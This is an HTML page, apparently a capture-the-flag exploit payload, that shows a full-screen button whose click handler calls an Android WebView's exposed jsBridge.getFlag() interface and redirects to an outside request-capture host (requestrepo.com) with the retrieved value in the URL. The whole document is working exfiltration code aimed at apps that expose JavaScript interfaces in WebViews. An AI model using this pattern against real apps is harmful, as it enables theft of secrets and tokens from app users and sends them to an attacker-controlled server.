<!DOCTYPE html>
<html>
<head>
  <title>Fullscreen Button</title>
  <style>
    html, body {
      height: 100%;
      margin: 0;
    }

    button {
      width: 100%;
      height: 100%;
      font-size: 32px;
      background-color: #007BFF;
      color: white;
      border: none;
      cursor: pointer;
    }

    button:hover {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <button onclick="getFlag()">Click me</button>

  <script>
    function getFlag() {
      // If this is running inside an Android WebView with addJavascriptInterface
      if (window.jsBridge && typeof window.jsBridge.getFlag === "function") {
        const flag = window.jsBridge.getFlag();
        const flag2 = jsBridge.getFlag();
        window.location = "http://gfynf30y.requestrepo.com/"+flag + "/" + flag2 
      } else {
         // window.location = "gfynf30y.requestrepo.com/"+flag
      }
    }
  </script>
</body>
</html>
